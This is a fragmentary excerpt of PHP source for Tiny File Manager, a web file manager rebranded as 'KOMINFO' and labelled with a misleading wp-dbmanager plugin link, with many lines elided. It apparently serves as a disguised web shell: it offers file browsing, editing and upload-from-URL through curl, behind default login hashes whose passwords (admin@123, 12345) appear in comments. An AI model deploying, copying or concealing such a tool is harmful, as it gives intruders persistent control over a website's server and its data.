     ...
     * @link https://github.com/wordprees/wp-dbmanager
     */
    define('VERSION', '2.5.3');

    //Application Title
    define('APP_TITLE', 'KOMINFO');
    ...
    $auth_users = array(
        'admin' => '$2y$10$VVclBw6MlwQJqSRjHeWZ2ubf.pg2le0zlv/ZckK7Ry7tD1rATGdM.', //admin@123
        'user' => '$2y$10$VVclBw6MlwQJqSRjHeWZ2ubf.pg2le0zlv/ZckK7Ry7tD1rATGdM.' //12345
    );
                    ...
                    <div class="row justify-content-md-center h-100">
                        <div class="card-wrapper">
                            <div class="card fat <?php echo fm_get_theme(); ?>">
                                <div class="card-body">
                                    <form class="form-signin" action="" method="post" autocomplete="off">
                                        <div class="mb-3">
                                        <div class="brand">
                                                <img src="https://ik.imagekit.io/kmf/cropped-logo-kominfo_RCIhZisPL.png">
                                            </div>
                            ...
                            <div class="footer text-center">
                                &mdash;&mdash; &copy;
                                <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">Dinas Komunikasi dan Informatika</a> &mdash;&mdash;
                            </div>
                        </div>
                    </div>
                </div>
    ...
    if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
        ...
        if(isset($_POST['type']) && $_POST['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
            ...
            if (!$url) {
                ...
                @$fp = fopen($temp_file, "w");@$ch = curl_init($url);
        ...
        <div class="path">
            ...
            <div class="card mb-2 fm-upload-wrapper <?php echo fm_get_theme(); ?>">
                <div class="card-header">
                    <ul class="nav nav-tabs card-header-tabs"><li class="nav-item">
                ...
                <div class="card-body">
                    <div class="row">
                        <div class="col-xs-12 col-sm-6">
                            <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> KOMINFO <?php echo VERSION; ?></a></h3></p>
            ...
            <div class="col-12">
                ...
                if($is_onlineViewer) {
                    ...
                    if ($filenames !== false) {
                        ...
                        foreach ($filenames as $fn) {
                            if ($fn['folder']) {echo '<b>' . fm_enc($fn['name']) . '</b><br>';
                            } else {
    ...
    if (isset($_GET['edit']) && !FM_READONLY) {
        ...
        <div class="path">
            ...
            <?php
            if ($is_text && $isNormalEditor) {echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">' . htmlspecialchars($content) . '</textarea>';
    ...
    */
    ...
    class FM_Zipper
    {
        ...
        /**
         * Add folder recursively* @param string $path
         * @return bool
         */
    ...
    class FM_Config
    {
        ...
        function __construct()
        {
            ...
            if (strlen($CONFIG)) {
                ...
                $msg = 'KOMINFO<br>Error: Cannot load configuration';
                if (substr($fm_url, -1) == '/') {
                    $fm_url = rtrim($fm_url, '/');
                    $msg .= '<br>';
    ...
    <head>
        ...
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with KOMINFO">
    ...
    <script>
        ...
        $(document).ready( function () {
            ...
            //upload nav tabs
            $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){e.preventDefault();let target=$(this).data('target');
    ...
    function lng($txt) {
        ...
        // English Language
        $tr['en']['AppName']        = 'KOMINFO';      $tr['en']['AppTitle']           = 'File Manager';
